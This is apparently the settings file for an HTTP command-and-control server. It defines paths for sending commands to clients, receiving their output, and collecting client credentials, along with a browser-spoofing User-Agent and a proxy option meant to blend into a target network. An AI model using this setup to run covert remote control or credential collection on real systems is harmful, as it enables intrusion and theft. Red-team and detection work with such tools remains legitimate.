
# Server's IP address or hostname
SERVER_IP = 'localhost'

# Server Port
SERVER_PORT = 8082

# Keep the User-Agent up-to-date and looking like a modern browser; Python dictionary format
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"}

# Set proxy to None or match target network's proxy using a Python dictionary format
PROXY = None

# Path to use for signifying a command request from a client using HTTP GET
CMD_REQUEST = "/amos?center="

# Path to use for signifying command output or errors from a client using HTTP POST
CMD_RESPONSE = "/inventory"

# Path to use for signifying sending client credentials
CLIENT_CREDENTIALS = "/credentials"

# POST variable name to use for assigning to command output from a client
RESPONSE_KEY = "index"

# Define a sleep delay time in seconds for re-connection attempts
DELAY = 20
